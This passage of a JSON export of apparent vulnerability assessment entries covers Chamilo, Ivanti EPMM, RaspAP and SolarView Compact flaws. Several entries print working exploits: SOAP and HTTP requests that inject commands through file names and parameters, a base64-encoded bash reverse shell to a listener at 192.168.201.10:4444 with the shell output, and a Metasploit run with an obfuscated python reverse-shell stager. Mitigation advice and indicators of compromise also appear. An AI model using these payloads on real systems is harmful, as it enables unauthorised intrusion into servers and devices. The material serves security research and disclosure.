xmlns:ns1=\"/chamilo\"\r\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n  xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\n  xmlns:ns2=\"http://xml.apache.org/xml-soap\"\r\n  xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n  SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n  <SOAP-ENV:Body>\r\n    <ns1:wsConvertPpt>\r\n      <param0 xsi:type=\"ns2:Map\">\r\n        <item>\r\n          <key xsi:type=\"xsd:string\">file_data</key>\r\n          <value xsi:type=\"xsd:string\"></value>\r\n        </item>\r\n        <item>\r\n          <key xsi:type=\"xsd:string\">file_name</key>\r\n                   <value xsi:type=\"xsd:string\">`{{}}`.pptx'|\" |echo cuckoo||a #</value>\r\n        </item>\r\n        <item>\r\n          <key xsi:type=\"xsd:string\">service_ppt2lp_size</key>\r\n          <value xsi:type=\"xsd:string\">1310x643</value>\r\n        </item>\r\n      </param0>\r\n    </ns1:wsConvertPpt>\r\n  </SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n```\r\n**Burp Response**\r\n```html\r\nHTTP/1.1 200 OK\r\nDate: Fri, 28 Jul 2023 10:33:56 GMT\r\nServer: Apache/2.4.52 (Ubuntu)\r\nSet-Cookie: ch_sid=0doq0i6i2va7rf61bfq9ksg79u; path=/; HttpOnly\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 620\r\nVary: Accept-Encoding\r\nConnection: close\r\nContent-Type: text/xml; charset=utf-8\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<SOAP-ENV:Envelope\r\n  xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n  xmlns:ns1=\"http://192.168.201.47/chamilo/main/webservices/\"\r\n  xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" \r\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \r\n  xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n  SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n   <SOAP-ENV:Body>\r\n     <ns1:wsConvertPptResponse>\r\n       <return xsi:type=\"xsd:string\">\r\n          a:2:{s:5:\"files\";a:1:{i:0;s:6:\"cuckoo\";}s:6:\"images\";a:1:{s:0:\"\";s:0:\"\";}}\r\n       </return>\r\n     </ns1:wsConvertPptResponse>\r\n   </SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n```\r\nNow let's do a proper command injection and spawn a remote shell.\r\nLet's take a bash reverse shell: `bash -i >& /dev/tcp/192.168.201.10/4444 0>&1`\r\nTo avoid any issues with bad characters, we will encode the payload with `base64` and decode it again during execution.\r\n```console\r\n# echo -n \"bash -i >& /dev/tcp/192.168.201.10/4444 0>&1\"|base64\r\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS4xMC80NDQ0IDA+JjE=\r\n# nc -lnvp 4444\r\nlistening on [any] 4444 ...\r\n```\r\n**bash reverse shell burp request**\r\n```html\r\nPOST /chamilo/main/webservices/additional_webservices.php HTTP/1.1\r\nHost: 192.168.201.47\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\r\nContent-Type: text/xml; charset=utf-8\r\nContent-Length: 1084\r\nConnection: close\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<SOAP-ENV:Envelope\r\n  xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n  xmlns:ns1=\"/\"\r\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n  xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\n  xmlns:ns2=\"http://xml.apache.org/xml-soap\"\r\n  xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n  SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n  <SOAP-ENV:Body>\r\n    <ns1:wsConvertPpt>\r\n      <param0 xsi:type=\"ns2:Map\">\r\n        <item>\r\n          <key xsi:type=\"xsd:string\">file_data</key>\r\n          <value xsi:type=\"xsd:string\"></value>\r\n        </item>\r\n        <item>\r\n          <key xsi:type=\"xsd:string\">file_name</key>\r\n          <value xsi:type=\"xsd:string\">`{{}}`.pptx'|\" |echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMS4xMC80NDQ0IDA+JjE=|base64 -d|bash||a #</value>\r\n        </item>\r\n        <item>\r\n          <key xsi:type=\"xsd:string\">service_ppt2lp_size</key>\r\n          <value xsi:type=\"xsd:string\">1108x524</value>\r\n        </item>\r\n      </param0>\r\n    </ns1:wsConvertPpt>\r\n  </SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n```\r\n**bash reverse shell**\r\n```console\r\n# nc -lnvp 4444\r\nlistening on [any] 4444 ...\r\nconnect to [192.168.201.10] from (UNKNOWN) [192.168.201.47] 49682\r\nbash: cannot set terminal process group (35632): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\nwww-data@cuckoo:/var/www/html/chamilo/main/inc/lib/ppt2png$ uname -a\r\nuname -a\r\nLinux cuckoo 5.15.0-76-generic #83-Ubuntu SMP Thu Jun 15 19:16:32 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\r\nwww-data@cuckoo:/var/www/html/chamilo/main/inc/lib/ppt2png$ id\r\nid\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\r\nwww-data@cuckoo:/var/www/html/chamilo/main/inc/lib/ppt2png$\r\n```\r\nFor now, the OS command injection only works on `linux/unix` based operating systems due to the use of the backtic \\` operator.\r\nStill playing around to find a Windows variant.\r\n\r\nAnd as usual, there is a nice Metasploit module that does it all for you.\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/chamilo_unauth_rce_cve_2023_34960.rb) in my local repository or as [PR 18233](https://github.com/rapid7/metasploit-framework/pull/18233) at the Metasploit Github development.\r\n\r\nThis module has been tested on:\r\n* Ubuntu Linux 22.04\r\n* Chamilo 1.11.18\r\n* PHP 7.4\r\n\r\n**Instructions for a vulnerable Chamilo  installation on Ubuntu 22.04:**\r\n* [Follow these instructions](https://linux.how2shout.com/how-to-install-ubuntu-22-04-server-on-virtualbox/) to download and install Ubuntu 22.04 server on VirtualBox. \r\n* [Follow these instructions](https://linux.how2shout.com/2-ways-to-install-lamp-server-on-ubuntu-22-04-20-04/) to download and install LAMP on Ubuntu 22.04 server. \r\n* Download Chamilo `1.11.18` release from [here](https://github.com/chamilo/chamilo-lms/releases).\r\n* [Follow these instructions](https://11.chamilo.org/documentation/installation_guide.html#1._Pre-requisites) to install Chamilo.\r\n\r\n### Mitigation\r\nPlease update your `Chamilo` application to version `1.11.20` or higher.\r\n\r\n### References\r\n[Randorisec advisory](https://www.randorisec.fr/pt/chamilo-1.11.18-multiple-vulnerabilities)\r\n[CVE-2023-34960](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34960)\r\n[Chamilo Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/chamilo_unauth_rce_cve_2023_34960.rb)\r\n[Metasploit PR 18233](https://github.com/rapid7/metasploit-framework/pull/18233)\r\n[Chamilo release downloads](https://github.com/chamilo/chamilo-lms/releases)\r\n[Chamilo installation instructions](https://11.chamilo.org/documentation/installation_guide.html#1._Pre-requisites)\r\n\r\n### Credits\r\n[Randorisec](mailto:contact@randorisec.fr)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d149b038-6c6c-4227-b573-86803f72f4a3",
      "editorId": "abbb2dd6-0728-482c-adaf-bfeec8557890",
      "topicId": "14ebb4a0-f165-41b2-9b60-4352c38c4f84",
      "created": "2023-08-01T18:38:23.230907Z",
      "revisionDate": "2023-08-07T09:47:17.075063Z",
      "document": "Due to this vulnerability being in a potentially internet-facing appliance, it is high value for attackers to seek out and find.  Combine this with no modern security protections such as ASLR or DEP with the root cause being a basic stack overflow, I expect we will see exploitation only increase.  The only aspect that may slow attackers down slightly is that unpolished exploitation can lead to the network stack crashing making a remote shell more difficult, however, this will decrease upon the publication of the Metasploit module. \r\n\r\nIf your own this product please PATCH!",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "5d7813c3-8061-4559-9601-8751f7cd6507",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "beb40b9c-db14-4417-8328-3e7871f5980b",
      "created": "2023-08-03T09:02:36.6679Z",
      "revisionDate": "2023-08-08T09:08:52.24419Z",
      "document": "_Update: August 8, 2023: Ivanti have indicated that CVE-2023-35082 affects all versions of Endpoint Manager Mobile (EPMM) prior to a patch released August 7, 2023. The attacker rating value for CVE-2023-35082 has been increased to reflect the new product versions affected by this vulnerability._\r\n\r\nCVE-2023-35082 gives an attacker unauthenticated API access to a vulnerable Ivanti Endpoint Manager Mobile (EPMM) or MobileIron Core target. \r\n\r\nAn attacker can access the MobileIron Core API unauthenticated, by including `/asfV3/` in the URL path, for example:\r\n\r\n```\r\nc:\\> curl -k https://192.168.86.103/mifs/asfV3/api/v2/ping\r\n```\r\n\r\nThis will successfully call the [ping API endpoint](https://help.ivanti.com/mi/help/en_us/CORE/11.x/api2/APIv2/APIv2Ping.htm#top), which is meant to require authentication from a user with admin role privileges, and the following result is returned:\r\n\r\n```xml\r\n{\"results\":{\"apiVersion\":2.0,\"vspVersion\":\"VSP 11.2.0.0 Build 31 \"}}\r\n```\r\n\r\nThe `/var/log/httpd/https-access_log` log file on the appliance will show indicators of compromise for entries containing `/mifs/asfV3/api/v2/`in the path and a HTTP response code of 200. For example:\r\n\r\n```\r\n192.168.86.34:61736 - - 2023-07-28--15-24-51 \"GET /mifs/asfV3/api/v2/ping HTTP/1.1\" 200 68 \"-\" \"curl/8.0.1\" 3285\r\n```",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8f225e3f-a838-4acf-bd3c-97d16c576e1e",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "d67e7348-5d7f-41aa-8125-31875281c8df",
      "created": "2023-08-15T03:28:14.48624Z",
      "revisionDate": "2023-08-15T03:28:14.485277Z",
      "document": "This is an unauthenticated command injection vulnerability in RaspAP, a wireless route software that runs on Debian-based devices. The vulnerable [raspap-webgui](https://github.com/RaspAP/raspap-webgui) application shouldn't be configured to be internet facing which and is reflected in this assessment's Attacker Value. Most endpoints on the application require a valid CSRF token to be accessed except for some, which include:\r\n \r\n- `/ajax/openvpn/activate_ovpncfg.php`\r\n- `/ajax/openvpn/del_ovpncfg.php`\r\n\r\nThese two endpoints accept a POST parameter `cfg_id` which gets run directly in a php `exec()` command without being sanitized. The vulnerable code can be seen below, or in full on the [RaspAP raspap-webgui github](https://github.com/RaspAP/raspap-webgui/blob/2.8.7/ajax/openvpn/activate_ovpncfg.php)\r\n\r\n```\r\n<?php\r\n\r\nrequire_once '../../includes/config.php';\r\nrequire_once '../../includes/functions.php';\r\n\r\nif (isset($_POST['cfg_id'])) {\r\n    $ovpncfg_id = $_POST['cfg_id'];\r\n    $ovpncfg_client = RASPI_OPENVPN_CLIENT_PATH.$ovpncfg_id.'_client.conf';\r\n    $ovpncfg_login = RASPI_OPENVPN_CLIENT_PATH.$ovpncfg_id.'_login.conf';\r\n\r\n    // remove existing client config +login and symbolically link the selected one\r\n    system(\"sudo rm \".RASPI_OPENVPN_CLIENT_CONFIG, $return);\r\n    system(\"sudo ln -s $ovpncfg_client \".RASPI_OPENVPN_CLIENT_CONFIG, $return);\r\n``` \r\n\r\nThis vulnerability can be exploited with a simple POST request in order to inject the following command: `touch /tmp/pwned`\r\n\r\n```\r\nPOST /ajax/openvpn/del_ovpncfg.php HTTP/1.1\r\nHost: 172.16.199.130\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13.4; rv:109.0) Gecko/20100101 Firefox/114.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 642\r\n\r\ncfg_id%3D%3Btouch%20%2Ftmp%2Fpwned%3B%23\r\n```\r\n\r\nOr if getting a shell is more your thing use the new Metasploit module to obtain a meterpreter session: \r\n```\r\nmsf6 > use exploit/unix/http/raspap_rce \r\n[*] Using configured payload cmd/unix/reverse_bash\r\nmsf6 exploit(unix/http/raspap_rce) > set rhosts 172.16.199.130\r\nrhosts => 172.16.199.130\r\nmsf6 exploit(unix/http/raspap_rce) > set lhost 172.16.199.1\r\nlhost => 172.16.199.1\r\nmsf6 exploit(unix/http/raspap_rce) > run\r\n\r\n[*] Started reverse TCP handler on 172.16.199.1:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target appears to be vulnerable.\r\n[*] Executing Unix Command with echo exec\\(__import__\\(\\'zlib\\'\\).decompress\\(__import__\\(\\'base64\\'\\).b64decode\\(__import__\\(\\'codecs\\'\\).getencoder\\(\\'utf-8\\'\\)\\(\\'eNo9UE1LxDAQPTe/IrckGMNmqZVdrCDiQUQEd28i0iajhqZpSLJaFf+7DVmcwwxv5s2bDzP6KSQcJzVA4t/W9LzvIjQ1jykcVOLJjIBep4BnbBwOnXsDKldsi6oUvhZfxbY0ixLomh/x7uH67mW3f7y5umeZJ9TkHKhEKZHnayEbITcbIQmvF2OZ0gfoBlTBrMCnrJ2Hi2gBPD1jyLZlJ3FwvlMDJZe3hEcRQH3QReBp9Yx0e8SWoc93YwFbcFSzC7vI6ZP/6mlJMwQzKJrPFhrUNPoAMdLyAdE3dU5qyEz+QyLZxl+G/gDVz18D\\'\\)\\[0\\]\\)\\)\\) | exec $(which python || which python3 || which python2) -\r\n[*] Sending stage (24772 bytes) to 172.16.199.130\r\n[*] Meterpreter session 1 opened (172.16.199.1:4444 -> 172.16.199.130:48494) at 2023-08-14 20:38:21 -0400\r\n\r\nmeterpreter > getuid\r\nServer username: www-data\r\nmeterpreter > sysinfo\r\nComputer     : debian\r\nOS           : Linux 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-2 (2023-07-27)\r\nArchitecture : x64\r\nMeterpreter  : python/linux\r\nmeterpreter > \r\n```\r\n\r\n# IOCs\r\n\r\nSince this is exploiting a parameter in a POST request, you won't see the payload in the logs. It might be worth searching for suspicious processes spawned by the user running the RaspAP application.  The user `www-data` is running the RaspAP application in this case and after running the Metasploit module, due to the python payload selected by default, there is a  suspicious`/usr/bin/python3` command running in the context of the user `www-data`.\r\n\r\n## Before \r\n```\r\nmsfuser@debian:~$ ps aux | grep www-data\r\nwww-data     866  0.0  0.1   5568  3804 ?        Ss   20:00   0:00 /usr/sbin/lighttpd -D -f /etc/lighttpd/lighttpd.conf\r\nwww-data     879  0.0  1.0 201008 21552 ?        Ss   20:00   0:00 /usr/bin/php-cgi\r\nwww-data     925  0.0  0.3 201008  5976 ?        S    20:00   0:00 /usr/bin/php-cgi\r\nwww-data     928  0.0  0.3 201008  5976 ?        S    20:00   0:00 /usr/bin/php-cgi\r\nwww-data     929  0.0  0.3 201008  5976 ?        S    20:00   0:00 /usr/bin/php-cgi\r\nwww-data     930  0.0  0.3 201008  5976 ?        S    20:00   0:00 /usr/bin/php-cgi\r\nmsfuser     2786  0.0  0.1   6332  2012 pts/0    S+   20:03   0:00 grep www-data\r\n```\r\n## After \r\n```\r\nmsfuser@debian:~$ ps aux | grep www-data\r\nwww-data     866  0.0  0.1   5568  3804 ?        Ss   20:00   0:00 /usr/sbin/lighttpd -D -f /etc/lighttpd/lighttpd.conf\r\nwww-data     879  0.0  1.0 201008 21552 ?        Ss   20:00   0:00 /usr/bin/php-cgi\r\nwww-data     925  0.0  0.3 201008  5976 ?        S    20:00   0:00 /usr/bin/php-cgi\r\nwww-data     928  0.0  0.6 201008 12404 ?        S    20:00   0:00 /usr/bin/php-cgi\r\nwww-data     929  0.0  0.5 201008 11468 ?        S    20:00   0:00 /usr/bin/php-cgi\r\nwww-data     930  0.0  0.3 201008  5976 ?        S    20:00   0:00 /usr/bin/php-cgi\r\nwww-data    2839  0.0  0.0      0     0 ?        Z    20:07   0:00 [sh] <defunct>\r\nwww-data    2846  1.3  1.5  43792 30976 ?        Ss   20:07   0:00 /usr/bin/python3 -\r\nmsfuser     2853  0.0  0.1   6332  2060 pts/0    S+   20:08   0:00 grep www-data\r\n```\r\n\r\n# Notes\r\nThe initial PoC write up mentioned in the references below indicates the command injection will result in execution in the context of the root user. This is incorrect and depends on how the RaspAP application has been deployed. \r\n\r\n# References\r\nhttps://medium.com/@ismael0x00/multiple-vulnerabilities-in-raspap-3c35e78809f2\r\nhttps://github.com/rapid7/metasploit-framework/pull/18263\r\n\r\n\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "95f21a77-617e-44da-901d-0000d1ff1df0",
      "editorId": "dd5d1885-7237-48ea-a618-f4c1ec4531c6",
      "topicId": "2e402a71-14c5-4e87-be02-5356a7be0a2b",
      "created": "2023-08-20T16:14:23.060751Z",
      "revisionDate": "2023-08-20T16:14:23.056801Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "d77beaa8-057b-4636-a016-73bcdf06f18c",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "ca375b44-1afe-4d1e-8a39-93a91c4e7a00",
      "created": "2023-08-23T21:55:56.464618Z",
      "revisionDate": "2023-08-28T11:11:17.031678Z",
      "document": "With the heat records breaking almost every day around the globe, Solar Energy solutions are becoming rapidly main stream in households around the world. If you look in the street where you live, you will probably find a few neighbors with solar panels installed on their roof and nice little apps that can track you solar energy capacity.\r\nCool stuff, but as always, when connected to the Internet, you can introduce an entry point for a attacker to hack into your solar energy devices / inverters. `Cyble ` security analysts recently published a nice report that explains the [Security Gaps in Green Energy Sector: Unveiling the Hidden Dangers of Public-Facing PV Measuring and Diagnostics Solutions](https://cyble.com/blog/security-gaps-in-green-energy-sector/).\r\n\r\nOne of these energy solution providers is a Japanese company called `Contec`, that provides Solar Energy solutions to the market. One of their solutions, [SolarView Compact](https://www.contec.com/products-services/environmental-monitoring/solarview/) has a vulnerability that allows remote code execution on  a vulnerable `SolarView Compact` device by bypassing internal restrictions through the vulnerable endpoint `downloader.php` using the `file` parameter. Firmware versions up to `v6.33` are vulnerable.\r\n\r\nAgain a very basic case of using direct system calls in your application code without sanitizing the input parameters properly.\r\n\r\nIf you analyze `downloader.php`,  you easily can identify the vulnerable code that triggers the remote code execution with a malicious request.\r\nYou can retrieve this information by downloading the [SolarView Compact firmware v600](https://www.contec.com/download/contract/contract2/?itemid=b28c8b7c-9f40-40b2-843c-b5b04c035b0e&downloaditemid=d76a935b-adbc-45ff-b80f-6f651c1af463). You need to register yourself before you can download the firmware `svcUpdateV600.fpk`.\r\n\r\nRun the following commands to access the firmware and extract `downloader.php`.\r\n```console\r\n# mv svcUpdateV600.fpk svcUpdateV600.gz\r\n# tar -ztvf./svcUpdateV600.gz html/downloader.php\r\n-rwxr--r--  0 nobody nogroup  1986 Dec  7  2018 html/downloader.php\r\n# tar -zxvf./svcUpdateV600.gz html/downloader.php\r\nx html/downloader.php\r\n```\r\n```php\r\n// downloader.php\r\n<?\r\nif( isset($_REQUEST['file']) ){\r\n    $file = $_REQUEST['file'];\r\n}\r\n\r\n//\r\nfunction get_extend( $filename ){\r\n    $pos = strrpos( $filename, \".\" );\r\n    return substr( $filename, $pos );\r\n}\r\n\r\n//\r\n//\r\n$ext = get_extend( $file );\r\n//\r\nswitch( $ext ){\r\ncase \".csv\":\r\n    break;\r\ncase \".jpg\":\r\ncase \".jpeg\":\r\ncase \".JPG\":\r\ncase \".JPEG\":\r\ncase \".Jpeg\":\r\ncase \".Jpg\":\r\ncase \".gif\":\r\ncase \".GIF\":\r\ncase \".Gif\":\r\n    $path = \"/home/www/html/images/\";\r\n    break;\r\ncase \".zip\":\r\n    // $file is not proper sanitized !!!!\r\n    $ARCH_FILE = sprintf(\"/home/contec/data/%s\", $file);\r\n    if( file_exists($ARCH_FILE) ){\r\n        unlink($ARCH_FILE);\r\n    }\r\n    $cmd = sprintf(\"/usr/local/bin/data_zip.sh %s > /dev/null\", basename($ARCH_FILE));\r\n     // Using a direct system call can trigger the RCE !!!!\r\n    system($cmd);\r\n    $file = $ARCH_FILE;\r\n    break;\r\n}\r\n....\r\n```\r\nA short demonstration below shows how easy it is to trigger the RCE.\r\n\r\n**Malicious burp request** using `curl http://TARGET-IP/downloader.php?file=%3Bid%3B.zip`\r\n```html\r\nGET /downloader.php?file=%3Bid%3B.zip HTTP/1.1\r\nHost: <TARGET-IP>\r\nUser-Agent: curl/7.88.1\r\nAccept: */*\r\nConnection: close\r\n```\r\n**Burp response**\r\n```html\r\nHTTP/1.1 200 OK\r\nX-Powered-By: PHP/5.2.17\r\nContent-type: text/html\r\nConnection: close\r\nDate: Wed, 23 Aug 2023 08:09:07 GMT\r\nServer: lighttpd/1.4.28\r\nContent-Length: 1072\r\n\r\n5000 rows exported. -> /tmp/history.csv\r\n\tzip warning: name not matched: images/slide_monthly_guide.png\r\n\tzip warning: name not matched: images/slide_daily_guide.png\r\nzip I/O error: Not a directory\r\nzip error: Could not create output file (/home/contec/data/.zip)\r\nuid=1001(contec) gid=0(root)\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\r\n\r\n<HTML>\r\n<HEAD>\r\n\t<META HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/css; charset=Shift_JIS\">\r\n\t<LINK HREF=\"/css/style1.css\" REL=\"stylesheet\" TYPE=\"text/css\">\r\n\t<LINK REL=\"SHORTCUT ICON\" HREF=\"/favicon.ico\">\r\n\t<TITLE>Error 404</TITLE>\r\n</HEAD>\r\n<BODY>\r\n....\r\n```\r\nI will leave it to the readers imagination what else you can run then a simple `id` command, but the underlying `Linux armle` operating system has a nice rich command set such as `nc`, `wget`, `bash`, `python`, `openssl` and `base64` that can be leveraged for your RCE.\r\nAnd as you can see, we already get a little bonus because default the security context of the user `contec`, which is running the service, is part of the `root` group that gives us elevated privileges.\r\n\r\nA Metasploit module is in development.\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/solarview_unauth_rce_cve_2023_23333.rb) in my local repository or as [PR 18313](https://github.com/rapid7/metasploit-framework/pull/18313) at the Metasploit Github development.\r\n\r\n### Mitigation\r\nPlease update your `SolarView Compact` application to the latest available firmware which is `v8.00` or higher.\r\n\r\n### References\r\n[SolarView Compact](https://www.contec.com/products-services/environmental-monitoring/solarview/) \r\n[Security Gaps in Green Energy Sector](https://cyble.com/blog/security-gaps-in-green-energy-sector/)\r\n[CVE-2023-23333](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23333)\r\n[SolarView Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/solarview_unauth_rce_cve_2023_23333.rb)\r\n[Metasploit PR 18313](https://github.com/rapid7/metasploit-framework/pull/18313)\r\n\r\n### Credits\r\nTo all good fellows who raised this concern ;-)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
